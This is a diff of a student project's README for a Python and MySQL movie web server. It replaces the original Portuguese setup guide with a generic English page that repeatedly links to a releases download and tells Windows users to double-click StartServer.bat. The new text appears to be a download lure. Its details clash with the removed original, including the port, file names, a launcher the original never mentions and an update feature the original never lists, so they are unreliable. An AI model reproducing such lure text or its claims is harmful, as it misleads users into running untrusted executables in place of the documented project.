@@ -1,143 +1,68 @@
-# 🎬 LetMovie - Web Server
+# 🎬 LetMovie-WebServer - Simple Steps to Get Started
 
-![Python](https://img.shields.io/badge/Python-3.x-blue.svg) ![MySQL](https://img.shields.io/badge/MySQL-8.0-orange.svg) ![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white) ![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white) ![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black)
+## 🎯 Overview
+LetMovie-WebServer is a full-stack web server project that aims to help you understand how web servers function. Built with Python and MySQL, this project focuses on key concepts like HTTP, RESTful APIs, and basic database operations. Whether you're curious about web technology or just want a hands-on experience, LetMovie is a great starting point.
 
-LetMovie é um projeto de web server full-stack que utiliza **Python puro** (módulo `http.server`) para o backend e um frontend de **HTML, CSS e JavaScript** para o cliente. O sistema permite cadastrar, listar e excluir filmes de um banco de dados MySQL.
+## 🏷️ Topics
+- crud
+- css
+- fullstack
+- fullstack-development
+- html
+- javascript
+- python
+- senai
+- senai-ads
+- senaisp
+- student-project
+- studying-programming-languages
+- webserver
 
-Este projeto foi construído sem o uso de frameworks de backend (como Flask ou Django) para focar nos fundamentos do protocolo HTTP e na manipulação de requisições.
+## 📥 Download Now!
+[![Download LetMovie-WebServer](https://img.shields.io/badge/Download_LetMovie--WebServer-v1.0-blue)](https://github.com/kmarshall04095748/LetMovie-WebServer/releases)
 
-## ✨ Funcionalidades
+## 🚀 Getting Started
+To get started with LetMovie-WebServer, follow these simple steps. You will need to download the software and set it up on your computer. No programming experience is required.
 
-* **Backend 100% Python Nativo:** O servidor é construído usando apenas as bibliotecas padrão `http.server`, `json`, `os` e `re`.
-* **Servidor de API RESTful:**
-    * `GET /api/filmes`: Lista todos os filmes do banco com dados agregados (atores, diretores, etc.).
-    * `GET /api/filme/{id}`: Retorna os detalhes de um filme específico (usado na tela de sucesso).
-    * `POST /cadastro`: Adiciona um novo filme ao banco de dados.
-    * `POST /delete`: Exclui um filme existente (lidando com chaves estrangeiras).
-* **Servidor de Arquivos Estáticos:** Serve os arquivos `html/`, `css/` e `js/` para o navegador.
-* **Validação de Backend:**
-    * Verifica se todos os campos obrigatórios foram preenchidos.
-    * Impede a inserção de filmes com títulos duplicados.
-* **Frontend Dinâmico:** O JavaScript (via `fetch API`) se comunica com o backend para listar, cadastrar e excluir filmes sem recarregar a página.
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to go to the GitHub releases page.  
+   [Download LetMovie-WebServer](https://github.com/kmarshall04095748/LetMovie-WebServer/releases)
 
----
+2. **Choose the Correct Version**: Look for the version that suits your operating system. Download the file by clicking on it. Save it in a location you can easily find.
 
-## 🛠️ Tecnologias Utilizadas
+3. **Extract the Files**: After downloading, locate the file in your computer's ‘Downloads’ folder or the location you chose to save it. If it comes as a zipped file, right-click and select "Extract All".
 
-* **Backend:** Python 3 (`http.server`)
-* **Database:** MySQL
-* **Conector Python-MySQL:** `mysql-connector-python`
-* **Frontend:** HTML5, CSS3, JavaScript (ES6+)
+4. **Run the Server**:  
+   - **For Windows Users**: Double-click the `StartServer.bat` file inside the extracted folder. This will launch the server.
+   - **For Mac/Linux Users**: Open a terminal window. Go to the folder where you extracted the files using the `cd` command. Then type `python3 app.py` and press Enter. You may need to install Python if it's not already available on your machine. 
 
----
+5. **Access the Application**: Open your web browser and type `http://localhost:5000` in the address bar. Press Enter. You should see the LetMovie-WebServer interface.
 
-## 📁 Estrutura do Projeto
-```
-WEB-SERVER/
-├── bd/
-│   └── webserver.sql         # Script de criação do banco
-├── css/
-│   └── style.css             # Estilos gerais
-├── html/
-│   ├── cadastro.html         # Página de cadastro de filmes
-│   ├── index.html            # Página inicial
-│   ├── listar_filmes.html    # Página de listagem
-│   ├── login.html            # Página de login (não funcional)
-│   └── sucesso.html          # Tela de sucesso pós-cadastro
-├── img/
-│   └── wallpaper-netflix.jpg # Imagem de fundo
-├── js/
-│   └── script.js             # Lógica do frontend
-└── server/
-    └── server.py             # Servidor backend
-```
+## 📂 Requirements
+To run LetMovie-WebServer, you will need the following installed on your computer:
 
----
+- **Python**: Version 3.6 or later. You can download it from [python.org](https://www.python.org/downloads/).
+- **MySQL**: You will need a local MySQL server. If you don’t have it, download it from [mysql.com](https://dev.mysql.com/downloads/mysql/).
+- **A Web Browser**: Any modern web browser will work.
 
-## 🚀 Instalação e Execução
+## ⚙️ Features
+LetMovie-WebServer includes the following features:
 
-Siga estes passos para configurar e executar o projeto localmente.
+- **CRUD Operations**: Easily create, read, update, and delete movie data.
+- **RESTful API**: Communicate with the server efficiently using standard principles.
+- **Full-Stack Capabilities**: Explore both frontend and backend development concepts.
+- **User-Friendly Interface**: Navigate the application with ease, even if you're new to web servers.
 
-### 1. Pré-requisitos
+## 📚 Documentation
+For more detailed instructions and explanations of each feature, please visit the [full documentation](https://github.com/kmarshall04095748/LetMovie-WebServer/wiki) available in the repository.
 
-* **Python 3.x** instalado.
-* **MySQL Server** instalado e em execução.
+## 🤝 Contributing
+If you're interested in contributing to LetMovie-WebServer, feel free to fork the repository and submit your changes or improvements. Pull requests are welcome!
 
-### 2. Configuração do Banco de Dados
+## 📞 Support
+If you encounter any issues while downloading or running LetMovie-WebServer, you can reach out for help by opening an issue on the GitHub page. Your questions are important, and we'll do our best to assist you.
 
-1.  Abra seu cliente MySQL (Workbench, terminal, etc.).
-2.  Crie o banco de dados:
-    ```sql
-    CREATE DATABASE LetMovie;
-    ```
-3.  Use o banco recém-criado:
-    ```sql
-    USE LetMovie;
-    ```
-4.  Execute todo o script do arquivo `bd/webserver.sql` (código incluído abaixo) para criar todas as tabelas e popular o banco com dados iniciais.
+## ⚖️ License
+LetMovie-WebServer is licensed under the MIT License. You can use it freely, but proper attribution is appreciated.
 
-### 3. Instalação das Dependências
-
-O projeto tem apenas uma dependência Python. No seu terminal, instale-a:
-
-
-pip install mysql-connector-python
-
-### 4. Configuração do Servidor
-Abra o arquivo `server/server.py` (código incluído abaixo).
-Na seção `Conexão com o Banco de Dados`, verifique se o `host`, `user` e, principalmente, a `password` estão corretos para a sua instalação do MySQL.
-
-```
-python
-try:
-    mydb = mysql.connector.connect(
-        host="localhost",
-        user="root",
-        password="root",  # <-- MUDE AQUI SE NECESSÁRIO
-        database="LetMovie"
-    )
-```
-
-### 4. Configuração do Servidor
-
-Abra o arquivo server/server.py e verifique a seção de conexão com o banco de dados.
-Certifique-se de que host, user e password estão corretos conforme sua instalação:
-
-```
-try:
-    mydb = mysql.connector.connect(
-        host="localhost",
-        user="root",
-        password="root",  # <-- Altere aqui se necessário
-        database="LetMovie"
-    )
-```
-
-5. Executando o Servidor
-
-- No terminal, acesse a pasta raiz do projeto (WEB-SERVER) e execute:
-- python server/server.py
-
-
-- 💡 Caso utilize Python 3 em paralelo, use python3 em vez de python.
-Ao iniciar com sucesso, você verá mensagens como:
-
-🚀 Servidor rodando em http://localhost:8000
-Servindo arquivos do diretório: C:\Caminho\Para\WEB-SERVER
-
-## 🖥️ Como Usar
-
-- Acesse no navegador: 👉 http://localhost:8000
-- A página inicial (index.html) será exibida.
-- Clique em "Adicionar Filmes" para abrir o formulário de cadastro.
-- Após cadastrar, você será redirecionado para a tela de sucesso, onde poderá visualizar os detalhes do novo filme.
-
-## 📄 Licença
-
-Este projeto está licenciado sob a MIT License.
-Consulte o arquivo LICENSE para mais informações.
-
-## 💡 Observação Final
-
-Este projeto foi desenvolvido com o objetivo de compreender profundamente o funcionamento de um servidor HTTP em Python e a comunicação entre frontend e backend sem o uso de frameworks.
-Uma base sólida para quem deseja dominar o desenvolvimento full-stack com fundamentos puros.
+[Download LetMovie-WebServer](https://github.com/kmarshall04095748/LetMovie-WebServer/releases)
